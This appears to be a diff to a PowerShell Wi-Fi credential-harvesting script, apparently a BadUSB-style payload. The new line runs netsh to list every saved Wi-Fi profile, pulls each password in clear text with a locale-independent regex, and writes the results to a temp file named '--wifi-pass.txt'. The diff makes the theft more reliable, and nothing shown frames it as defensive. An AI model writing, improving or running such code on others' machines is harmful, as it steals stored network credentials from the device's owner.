@@ -1,6 +1,6 @@
 ############################################################################################################################################################
 
-$wifiProfiles = (netsh wlan show profiles) | Select-String "Profil\s+Tous.+:\s*(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Contenu de la clé\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
+$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{ $n=$_.Matches.Groups[1].Value.Trim(); $p=(netsh wlan show profile name="$n" key=clear | Select-String "(?:Content|Contenu|Key|Cl.).*?\:(.+)$" | %{$_.Matches.Groups[1].Value.Trim()}); [PSCustomObject]@{PROFILE_NAME=$n;PASSWORD=$p} } | Format-Table -AutoSize | Out-String
 
 
 $wifiProfiles > $env:TEMP/--wifi-pass.txt
